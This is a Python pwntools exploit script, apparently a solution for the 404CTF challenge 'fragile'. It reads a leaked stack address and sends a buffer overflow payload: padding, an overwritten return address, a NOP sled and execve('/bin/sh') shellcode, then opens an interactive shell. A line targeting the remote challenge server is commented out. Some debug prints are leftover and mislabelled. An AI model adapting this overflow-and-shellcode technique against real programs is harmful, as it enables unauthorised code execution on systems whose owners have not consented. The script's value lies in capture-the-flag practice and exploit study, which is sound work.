#!/usr/bin/env python3

import pwn

# pwn.context.log_level = "debug"
binary = "fragile"
host, port = "challenge.404ctf.fr", 31720
ecart = 0x48
charge = pwn.cyclic(0x48)
elf = pwn.ELF(binary)
stdout = pwn.process.PTY
stdin = pwn.process.PTY
stderr = pwn.process.PTY
pwn.context.binary = binary
target = pwn.process(["./" + binary], stdout=stdout, stdin=stdin)
# target = pwn.remote(host, port)
target.recvuntil(b"Cadeau : ")
cadeau = target.recvline()
RIP = pwn.p64(int(cadeau, 16) + ecart + 0x8)
puts = elf.symbols["puts"]
pwn.info("RIP = {}".format(hex(pwn.u64(RIP))))
pwn.info("printf = {}".format(hex(puts)))
gift_addr = hex(int(cadeau, 16))
main_addr = hex(int(cadeau, 16) + ecart + 0x8)
print(elf.got["__libc_start_main"])
main_got = elf.got["__libc_start_main"]
print(elf.got["printf"])
printf_got = elf.got["printf"]
ecart = printf_got - main_got
print("l'Ã©cart est de : 0x{:2}".format(ecart))
payload = (
    charge
    + RIP
    + b"\x90" * 20
    + b"\x6a\x68\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x2f\x73\x50\x48\x89\xe7\x68\x72\x69\x01\x01\x81\x34\x24\x01\x01\x01\x01\x31\xf6\x56\x6a\x08\x5e\x48\x01\xe6\x56\x48\x89\xe6\x31\xd2\x6a\x3b\x58\x0f\x05"
)
# pwn.info("sending shellcode: {}".format(shellcode))
pwn.info("sending payload: {}".format(payload))
pwn.info("gift: {}\nmain: {}".format(gift_addr, main_addr))
target.sendline(payload)
# target.stream()
target.interactive()
